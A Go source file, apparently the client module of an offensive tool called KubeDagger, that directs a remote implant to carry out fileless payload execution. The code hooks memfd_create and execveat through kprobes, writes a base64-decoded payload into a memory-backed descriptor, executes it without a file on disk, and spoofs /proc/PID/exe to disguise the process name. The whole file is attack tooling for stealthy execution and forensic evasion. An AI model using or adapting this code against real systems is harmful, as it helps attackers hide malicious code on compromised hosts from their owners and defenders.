package fileless

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type FilelessResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, payload, fakeName, output string) error {
	result := &FilelessResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_memfd_create",
			"kprobe on memfd_create to assist anonymous file descriptor creation",
			"fileless_hook_memfd",
		},
		{
			"write_payload_to_memfd",
			"write base64-decoded payload into anonymous memory-backed file descriptor",
			"fileless_write_payload",
		},
		{
			"hook_execveat",
			"kprobe on execveat to execute payload from fd without filesystem artifact",
			"fileless_hook_execveat",
		},
		{
			"execute_from_fd",
			"trigger execveat(fd, \"\", argv, envp, AT_EMPTY_PATH) for fileless execution",
			"fileless_exec_fd",
		},
		{
			"spoof_proc_exe",
			"modify /proc/PID/exe symlink readout to show fake process name",
			"fileless_spoof_exe",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + payload + "#" + fakeName
		status := shared.SendCommand(target, "/fileless_exec", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
